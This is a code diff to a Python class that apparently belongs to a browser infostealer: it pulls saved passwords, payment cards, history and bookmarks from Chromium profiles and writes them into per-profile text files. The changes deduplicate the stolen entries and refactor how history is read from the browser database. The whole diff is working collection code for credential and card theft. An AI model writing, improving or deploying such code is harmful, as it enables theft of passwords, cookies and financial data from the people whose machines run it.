@@ -74,7 +74,7 @@ class Chromium(Process):
         ]
 
         with open(rf"{self.path}\{args[0]} Passwords.txt", "a", encoding="utf-8") as passwords:
-            passwords.write("".join(item for item in temp))
+            passwords.write("".join(item for item in list(set(temp))))
 
     def _write_cookies(self, *args):
 
@@ -124,22 +124,22 @@ class Chromium(Process):
         ]
 
         with open(rf"{self.path}\{args[0]} Cards.txt", "a", encoding="utf-8") as cards:
-            cards.write("".join(item for item in temp))
+            cards.write("".join(item for item in list(set(temp))))
 
     def _write_history(self, *args):
 
-        history_list = args[1].execute(self.config.HistorySQL).fetchall()
+        results = args[1].execute(self.config.HistorySQL).fetchall()
 
-        if not history_list:
+        if not results:
             return
 
-        temp = []
+        history_list = (args[1].execute(self.config.HistoryLinksSQL % int(item[0])).fetchone() for item in results)
+
         data = self.config.HistoryData
-
-        for item in history_list:
-
-            result = args[1].execute(self.config.HistoryLinksSQL % item[0]).fetchone()
-            temp.append(data.format(result[0], result[1], self._get_datetime(result[2])))
+        temp = [
+            data.format(result[0], result[1], self._get_datetime(result[2]))
+            for result in history_list
+        ]
 
         with open(rf"{self.path}\{args[0]} History.txt", "a", encoding="utf-8") as history:
             history.write("".join(item for item in list(set(temp))))
@@ -158,7 +158,7 @@ class Chromium(Process):
         ]
 
         with open(rf"{self.path}\{args[0]} Bookmarks.txt", "a", encoding="utf-8") as bookmarks:
-            bookmarks.write("".join(item for item in temp))
+            bookmarks.write("".join(item for item in list(set(temp))))
 
     def _get_browser_paths(self, profile):
         return (
